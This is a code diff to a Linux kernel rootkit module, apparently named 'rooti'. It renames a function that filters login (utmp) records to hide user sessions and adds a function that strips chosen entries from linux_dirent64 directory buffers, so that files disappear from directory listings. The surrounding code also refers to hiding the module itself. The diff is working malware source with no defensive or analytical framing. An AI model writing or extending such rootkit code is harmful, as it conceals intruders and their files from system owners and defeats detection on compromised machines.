@@ -1,5 +1,6 @@
 #include <linux/module.h>
 #include <linux/types.h>
+#include <linux/dirent.h>
 #include "utmp.h"
 #include "hide.h"
 
@@ -31,7 +32,7 @@ void rooti_showme()
     prev_module = NULL;
 }
 
-int rooti_filter_user_entry(char *user_buf, size_t count, char *name)
+int rooti_filter_login_entry(char *user_buf, size_t count, char *name)
 {
     char *kernel_buf = kmalloc(count, GFP_KERNEL);
     if (kernel_buf == NULL) {
@@ -59,4 +60,18 @@ int rooti_filter_user_entry(char *user_buf, size_t count, char *name)
 
     kfree(kernel_buf);
     return 0;
+}
+
+size_t rooti_filter_dir_entry(struct linux_dirent64 *curr_record, struct linux_dirent64 *prev_record, size_t count)
+{
+    // Special case where the record to hide is the first one
+    if (prev_record == NULL) {
+        // Shift the entire buffer to override the first record
+        count -= curr_record->d_reclen;
+        memmove(curr_record, (void *)curr_record + curr_record->d_reclen, count);
+    } else {
+        // Increase the size of previous record to override the current record
+        prev_record->d_reclen += curr_record->d_reclen;
+    }
+    return count;
 }
